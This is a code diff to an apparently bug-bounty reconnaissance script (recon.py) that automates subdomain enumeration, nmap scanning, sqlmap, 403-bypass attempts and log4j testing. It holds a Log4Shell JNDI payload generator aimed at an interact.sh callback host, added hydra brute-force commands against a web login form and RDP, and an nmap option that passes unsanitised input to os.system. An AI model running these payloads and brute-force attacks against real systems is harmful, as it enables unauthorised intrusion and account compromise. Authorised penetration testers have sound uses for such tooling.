@@ -31,35 +31,10 @@ from urllib.parse import urljoin
 import webbrowser
 # from icecream import ic #cool print debugging, did a pip3 install but shows an error, still works though ;0 (https://towardsdatascience.com/do-not-use-print-for-debugging-in-python-anymore-6767b6f1866d)
 
-## Vars ##
-
-##Logging##
-logTarget = "reco"
-#platform = "bugcrowd"
-# platform = "hacker1"
-# Make sure you / at the end $path/logs/ NOT $path/logs
-# logDir = f"~/{platform}/{logTarget}/logs/"
-logDir = f"/{logTarget}/logs/"
-##</Logging##
-
-##wordlists##
-#wordlist="/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt"
-# wordlist = "/usr/share/wordlists/wfuzz/general/big.txt"
-wordlist = "/usr/share/wordlists/dirb/common.txt"
-##</wordlists##
-
-##listeners##
-attackerLDAP = 'yourinteracturl.interact.sh:1389'
-callback_host = 'yourinteracturl.interact.sh'
-##</listeners##
-
 ##helpful tidbits##
 randomIntSmall = random.randint(2,11)    #random int between 1 & 10
 randomIntBig = random.randint(2,1001)
 ##</helpful tidbits##
-
-## </Vars ##
-
 
 def generate_payload(protocol, callback_attacker, payload_string):
     new_payload = '${jndi:{{protocol}}://{{callback_attacker}}/{{payload}}}'
@@ -243,7 +218,8 @@ def addHttps(file=None):
 
 
 def sublist3r(URL=None):
-    command = (f"python3 /github/Sublist3r/sublist3r.py -d {{target}} -t 15 -o {logDir}{{target}}-Sublist3r")
+    # command = (f"python3 /github/Sublist3r/sublist3r.py -d {{target}} -t 15 -o {logDir}{{target}}-Sublist3r")   #ubuntu install.sh file changes required
+    command = (f"sublist3r -d {{target}} -t 15 -o {logDir}{{target}}-Sublist3r")
 
     if URL == None:
         for i in open(logDir + "targetDomains", 'r').read().splitlines():
@@ -486,7 +462,7 @@ def IPlookup(host):
         return ipval.to_text()
 
 
-def nmap(dom=None):
+def nmap(dom=None, scantype=None):
     cprint("Masscan doens't take domains as input, only IP's but an NSLookup will occur on domains\n", "red")
 
     # os.system(f"nmap -sC -A -T 4 -sV -Pn --top-ports 100 {dom} >> {logDir}{dom} -nmap")
@@ -522,12 +498,9 @@ def nmap(dom=None):
 
         cprint(f"[Single] Running nmap on {dom} log file location: {logDir}{dom}-nmap\n", "green")
         cprint("Commands being run:\n", "green")
-        nmap = nmap.replace("{dom}", dom)
-        # vulners = vulners.replace("{dom}", dom)
+        nmap = scantype.replace("{dom}", dom)
         cprint(nmap, "magenta")
-        # cprint(vulners, "magenta")
         os.system(nmap)
-        # os.system (vulners)
 
         # cprint(f"[Single] Running masscan on {dom} log file location: {logDir}{dom}-masscan", "green")
         # masscanIP = IPlookup(dom)
@@ -634,9 +607,10 @@ def hydra(host):
 
     # hydra -s 443 https-post-form "<LOGIN_PAGE>:<REQUEST_BODY>:<ERROR_MESSAGE> -l <USER> -p <PASSWORD> <IP_ADDRESS> "   # For HTTPS
     payload = "/33df0826a8/login/:username=^USER^&password=^PASS^:Invalid username"
-    ####
-    os.system(f'hydra {host} http-post-form "{payload}" -l username -P passes.txt')
     
+    ####
+    os.system(f'hydra -t 64 {host} http-post-form "{payload}" -l username -P {wordlist}')
+    os.system(f'hydra -t 64 -l pedro -P {wordlist} rdp://{host}')   #RDP brute force
 
 def bypass403():
     cprint("Trying bypass payloads for 403 pages for targets in file: targetscodes403", "green")
@@ -861,7 +835,7 @@ parser.add_argument("--bustmap", nargs='?', metavar="DOMAIN", help='Run NMAP and
 parser.add_argument("--bustmapql", nargs='?', metavar="DOMAIN", help='Same as --bustmap module but with sqlmap crawl')
 parser.add_argument("--log4j", nargs='?', metavar="URL", help='Run log4j scanner on file: \033[92m\033[1mlog4jtargs\033[0m (python3 recon.py --log4j) OR single URL: (python3 recon.py --log4j $URL)')
 parser.add_argument("--sqlmap", nargs='?', metavar="URL", help='Run SQLMap on file: \033[92m\033[1mSQLMAPTargets\033[0m (python3 recon.py --sqlmap) or single URL (python3 recon.py --sqlmap $url)')
-parser.add_argument("--nmap", nargs='?', metavar="DOMAIN", help='Run NMAP and(or) Masscan on file: \033[92m\033[1mNMAPTargets\033[0m (python3 recon.py --nmap) OR single domain: (python3 recon.py --nmap $domain)')
+parser.add_argument("--nmap", nargs='?', metavar="DOMAIN", help='Run NMAP and(or) Masscan on file: \033[92m\033[1mNMAPTargets\033[0m (python3 recon.py --nmap) OR single domain: (python3 recon.py --nmap $domain $scantype)')
 parser.add_argument("--urlstatus", nargs='?', metavar="FILE", help='Check URL status on file: \033[92m\033[1mdedupedTargets\033[0m (python3 recon.py --urlstatus) OR single file: (python3 recon.py --urlstatus $file) (Data goes to seperate files)')
 parser.add_argument("--waybackurls", nargs='?', metavar="DOMAIN", help='Run waybackurls on file: \033[92m\033[1mtargetDomains\033[0m (python3 recon.py --waybackurls) OR single URL: (python3 recon.py --waybackurls $url)')
 parser.add_argument("--sublister", nargs='?', metavar="DOMAIN", help='Run Subl1st3r on file: \033[92m\033[1mtargetDomains\033[0m (python3 recon.py --sublister) OR single domain: (python3 recon.py --sublister $domain)')
@@ -967,7 +941,7 @@ def main():
             if args == []:
                 nmap()
             else:
-                nmap(args[0])
+                nmap(args[0], args[1])
 
         elif opt == ("--urlstatus"):
             if args == []:
